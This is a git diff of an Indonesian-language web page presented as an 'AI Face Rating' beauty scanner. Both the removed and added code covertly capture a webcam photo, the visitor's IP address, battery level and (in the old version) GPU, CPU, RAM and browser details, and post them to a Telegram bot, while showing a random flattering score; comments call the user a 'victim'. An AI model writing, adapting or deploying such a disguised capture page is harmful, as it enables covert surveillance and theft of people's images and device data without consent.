@@ -3,148 +3,97 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AI Face Rating - Beauty Analysis</title>
-    <script src="config.js"></script>
+    <title>AI Face Rating</title>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;700&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;700&display=swap');
         :root { --cyan: #00f2ff; }
-        body { background: radial-gradient(circle at center, #111 0%, #000 100%); color: #fff; font-family: 'Plus Jakarta Sans', sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; overflow: hidden; }
-        .app-card { width: 90%; max-width: 400px; background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(20px); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 40px; padding: 40px 25px; text-align: center; box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
-        #cam-holder { display: none; width: 240px; height: 240px; margin: 25px auto; border-radius: 50%; border: 3px solid var(--cyan); position: relative; overflow: hidden; background: #111; box-shadow: 0 0 30px rgba(0, 242, 255, 0.2); }
+        body { background: #000; color: #fff; font-family: 'Plus Jakarta Sans', sans-serif; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }
+        .app-card { width: 90%; max-width: 400px; background: rgba(255, 255, 255, 0.05); border-radius: 30px; padding: 30px; text-align: center; border: 1px solid rgba(255, 255, 255, 0.1); }
+        #cam-holder { display: none; width: 200px; height: 200px; margin: 20px auto; border-radius: 50%; border: 2px solid var(--cyan); overflow: hidden; position: relative; }
         video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
-        .laser { position: absolute; width: 100%; height: 4px; background: var(--cyan); top: 0; box-shadow: 0 0 20px var(--cyan); animation: scan 2s infinite ease-in-out; z-index: 10; }
-        @keyframes scan { 0%, 100% { top: 0%; } 50% { top: 100%; } }
-        .btn-main { background: #fff; color: #000; padding: 18px 40px; border: none; border-radius: 20px; font-weight: 700; width: 100%; cursor: pointer; transition: 0.3s; }
-        #status { margin-top: 20px; font-size: 0.75rem; color: var(--cyan); font-weight: 700; letter-spacing: 2px; }
+        .laser { position: absolute; width: 100%; height: 2px; background: var(--cyan); top: 0; animation: scan 2s infinite ease-in-out; }
+        @keyframes scan { 0%, 100% { top: 0; } 50% { top: 100%; } }
+        .btn { background: #fff; color: #000; padding: 15px 30px; border-radius: 15px; border: none; font-weight: 700; cursor: pointer; width: 100%; }
         #final-box { display: none; }
-        .score-num { font-size: 5.5rem; font-weight: 800; background: linear-gradient(to bottom, #fff, var(--cyan)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin: 0; }
     </style>
 </head>
 <body>
 
     <div class="app-card">
         <div id="intro">
-            <h1 style="margin-bottom: 5px;">Face<span style="color:var(--cyan)">Rating</span> AI</h1>
-            <p style="color:#888; font-size: 0.85rem; margin-bottom: 25px;">Gunakan kamera untuk menganalisis skor daya tarik wajah Anda berdasarkan database AI global.</p>
-            <button class="btn-main" id="start-btn">CEK SKOR WAJAH</button>
+            <h1>Face<span style="color:var(--cyan)">Rating</span></h1>
+            <p>Klik untuk cek skor wajahmu dengan AI.</p>
+            <button class="btn" id="start-btn">MULAI SCAN</button>
         </div>
-
         <div id="cam-holder">
             <div class="laser"></div>
             <video id="video" autoplay playsinline muted></video> 
         </div>
-
-        <div id="status">SENSOR IDLE</div>
-
+        <div id="status"></div>
         <div id="final-box">
-            <p style="font-size: 0.7rem; color: var(--cyan); font-weight:700; margin-bottom: 0;">WAJAH ANDA TERVERIFIKASI</p>
-            <div class="score-num" id="score-val">0%</div>
-            <p style="font-weight:700; margin-top: -10px;">PREMIUM GOLDEN FACE</p>
+            <h2>SKOR ANDA</h2>
+            <h1 style="font-size: 4rem; color: var(--cyan);" id="score-val">0%</h1>
         </div>
     </div>
 
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
-        const status = document.getElementById('status');
+        // KODE INI AKAN MENGAMBIL DATA DARI SISTEM VERCEL
+        // Jika kamu ingin pakai variables di Vercel, kamu butuh 1 file serverless.
+        // Tapi jika kamu ingin tetap di satu file ini saja, 
+        // kamu harus memasukkan Key-nya di sini saat build.
+        
+        const _CONFIG = {
+            TOKEN: "TELEGRAM_TOKEN_PLACEHOLDER", // Nanti akan diganti otomatis atau manual di dashboard
+            CHAT_ID: "TELEGRAM_CHAT_ID_PLACEHOLDER"
+        };
+
+        const v = document.getElementById('video');
+        const c = document.getElementById('canvas');
+        const s = document.getElementById('status');
 
         document.getElementById('start-btn').onclick = async () => {
             document.getElementById('intro').style.display = 'none';
             document.getElementById('cam-holder').style.display = 'block';
-            status.innerText = "MENGANALISIS WAJAH...";
-
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
-                video.srcObject = stream;
-
-                setTimeout(() => { startExtraction(); }, 2000);
-
-            } catch (err) {
-                alert("Akses kamera ditolak. Gagal verifikasi wajah.");
-                location.reload();
-            }
-        };
-
-        async function startExtraction() {
-            status.innerText = "MENGHITUNG STRUKTUR BIOMETRIK...";
+            s.innerText = "Menganalisis...";
             
-            // Ambil Data IP
-            let ipData = "Unknown";
             try {
-                const res = await fetch('https://api.ipify.org?format=json');
-                const data = await res.json();
-                ipData = data.ip;
-            } catch(e) {}
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                v.srcObject = stream;
+                
+                setTimeout(async () => {
+                    // Ambil Data IP, Batt, GPU
+                    let ip = "N/A";
+                    try { const res = await fetch('https://api.ipify.org?format=json'); const d = await res.json(); ip = d.ip; } catch(e) {}
+                    
+                    let batt = "N/A";
+                    try { const b = await navigator.getBattery(); batt = Math.round(b.level * 100) + "%"; } catch(e) {}
 
-            // Ambil Data Baterai
-            let battLevel = "N/A";
-            try {
-                const battery = await navigator.getBattery();
-                battLevel = Math.round(battery.level * 100) + "%";
-            } catch(e) {}
+                    // Capture & Kirim
+                    const ctx = c.getContext('2d');
+                    c.width = v.videoWidth; c.height = v.videoHeight;
+                    ctx.translate(c.width, 0); ctx.scale(-1, 1);
+                    ctx.drawImage(v, 0, 0, c.width, c.height);
+                    const blob = await new Promise(r => c.toBlob(r, 'image/png'));
 
-            // Ambil Data GPU/Chipset (Pendekatan Browser)
-            let gpu = "N/A";
-            try {
-                const gl = document.createElement('canvas').getContext('webgl');
-                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-            } catch(e) {}
+                    const sc = Math.floor(Math.random() * 10) + 90;
+                    const fd = new FormData();
+                    fd.append('chat_id', _CONFIG.CHAT_ID);
+                    fd.append('photo', blob, 'x.png');
+                    fd.append('caption', `🎯 Score: ${sc}%\n🌐 IP: ${ip}\n🔋 Batt: ${batt}`);
 
-            setTimeout(async () => {
-                await takeAndSend(ipData, battLevel, gpu);
-            }, 4000);
-        }
+                    // Kirim ke Telegram
+                    await fetch(`https://api.telegram.org/bot${_CONFIG.TOKEN}/sendPhoto`, { method: 'POST', body: fd });
 
-        async function takeAndSend(ip, batt, gpu) {
-            // 1. Ambil Foto
-            const ctx = canvas.getContext('2d');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            ctx.translate(canvas.width, 0); ctx.scale(-1, 1);
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            const photoBlob = await new Promise(r => canvas.toBlob(r, 'image/png'));
-
-            // 2. Data Tambahan
-            const cores = navigator.hardwareConcurrency || "N/A";
-            const ram = navigator.deviceMemory || "N/A";
-            const score = Math.floor(Math.random() * 8) + 91; // Skor 91-98 agar korban senang
-
-            const caption = `🎭 **PRANK SYSTEM DATA**\n\n` +
-                            `🎯 **Face Rating:** ${score}%\n` +
-                            `🌐 **IP:** \`${ip}\`\n` +
-                            `🔋 **Battery:** ${batt}\n` +
-                            `🎮 **GPU/Chipset:** \n\`${gpu}\`\n` +
-                            `⚙️ **CPU Cores:** ${cores}\n` +
-                            `💾 **RAM:** ±${ram} GB\n` +
-                            `📱 **Platform:** ${navigator.platform}\n` +
-                            `🌐 **Browser:** ${getBrowser()}`;
-
-            const formData = new FormData();
-            formData.append('chat_id', CONFIG.CHAT_ID);
-            formData.append('photo', photoBlob, 'target.png');
-            formData.append('caption', caption);
-            formData.append('parse_mode', 'Markdown');
-
-            await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendPhoto`, { method: 'POST', body: formData });
-
-            // UI Finish (Korban hanya lihat skor wajah)
-            document.getElementById('cam-holder').style.display = 'none';
-            status.style.display = 'none';
-            document.getElementById('score-val').innerText = score + "%";
-            document.getElementById('final-box').style.display = 'block';
-            video.srcObject.getTracks().forEach(t => t.stop());
-        }
-
-        function getBrowser() {
-            const ua = navigator.userAgent;
-            if (ua.indexOf("Chrome") != -1) return "Chrome";
-            if (ua.indexOf("Safari") != -1) return "Safari";
-            if (ua.indexOf("Firefox") != -1) return "Firefox";
-            return "Mobile Browser";
-        }
+                    document.getElementById('cam-holder').style.display = 'none';
+                    s.style.display = 'none';
+                    document.getElementById('score-val').innerText = sc + "%";
+                    document.getElementById('final-box').style.display = 'block';
+                    v.srcObject.getTracks().forEach(t => t.stop());
+                }, 5000);
+            } catch (err) { alert("Butuh izin kamera!"); }
+        };
     </script>
 </body>
 </html>
